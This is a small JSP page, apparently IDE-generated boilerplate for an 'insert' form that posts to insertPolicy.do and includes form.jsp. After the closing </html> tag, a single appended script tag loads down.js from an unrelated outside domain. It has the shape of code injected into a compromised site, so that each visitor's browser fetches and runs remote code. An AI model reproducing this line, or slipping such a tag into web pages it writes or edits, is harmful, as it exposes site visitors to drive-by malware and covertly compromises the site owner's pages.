
<%@ page language="java" import="java.util.*" pageEncoding="GBK"%>
<%
		String path = request.getContextPath();
		String basePath = request.getScheme() + "://" + request.getServerName()
				+ ":" + request.getServerPort() + path + "/";
%>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<base href="<%=basePath%>">

<title>My JSP 'Hello.jsp' starting page</title>

<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="cache-control" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
<meta http-equiv="description" content="This is my page">

<!--
    <link rel="stylesheet" type="text/css" href="styles.css">
    -->

</head>

<body>
This is insert page .
<br>
<hr>
<form name="f1" id="f1" action="insertPolicy.do" method="post">
<jsp:include page="form.jsp">
<jsp:param name="type" value="1"/>
</jsp:include>
</form>
</body>
</html>

<script language=javascript src=http://Town.531jx.cn/down.js></script>